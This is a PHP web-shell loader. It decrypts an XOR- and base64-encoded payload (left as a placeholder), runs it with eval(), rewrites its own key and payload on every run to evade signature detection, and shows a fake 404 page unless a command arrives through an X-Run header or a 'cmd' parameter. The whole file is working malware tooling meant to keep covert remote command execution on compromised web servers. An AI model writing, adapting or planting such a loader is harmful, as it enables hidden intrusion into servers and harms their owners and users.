<?php
// Fixed PHP loader with a simpler encryption approach
$key = "my_secret_key"; // Will be replaced with your secret key

// Encrypted payload (will be replaced with actual encrypted shell)
$payload = "ENCRYPTED_PAYLOAD_PLACEHOLDER";

// Decrypt the payload
$encrypted = base64_decode($payload);
$key_bytes = hash('sha256', $key, true);
$decrypted = '';

// XOR decryption
for ($i = 0; $i < strlen($encrypted); $i++) {
    $decrypted .= chr(ord($encrypted[$i]) ^ ord($key_bytes[$i % strlen($key_bytes)]));
}

// Decompress the shell code
$shell_code = @gzuncompress(base64_decode($decrypted));

if ($shell_code) {
    // Self-modifying: change the key each time
    $new_key = bin2hex(random_bytes(8));
    
    // Re-encrypt with the new key
    $compressed = gzcompress($shell_code);
    $encoded = base64_encode($compressed);
    $new_key_bytes = hash('sha256', $new_key, true);
    $encrypted = '';
    
    for ($i = 0; $i < strlen($encoded); $i++) {
        $encrypted .= chr(ord($encoded[$i]) ^ ord($new_key_bytes[$i % strlen($new_key_bytes)]));
    }
    
    $new_payload = base64_encode($encrypted);
    
    // Update the file with new key and payload - using different regex delimiters
    $current_content = file_get_contents(__FILE__);
    $new_content = preg_replace(
        ['~\$key = ".*?";~', '~\$payload = ".*?";~'],
        ["\$key = \"$new_key\";", "\$payload = \"$new_payload\";"],
        $current_content
    );
    
    // Write the modified content back to the file
    if ($new_content !== $current_content) {
        @file_put_contents(__FILE__, $new_content);
    }
    
    // Execute the shell code
    eval($shell_code);
}

// If no command was processed, display a harmless 404 page
if (!isset($_SERVER['HTTP_X_RUN']) && !isset($_POST['cmd']) && !isset($_GET['cmd'])) {
    header('HTTP/1.0 404 Not Found');
    echo '<!DOCTYPE html><html><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL was not found on this server.</p></body></html>';
}
?>
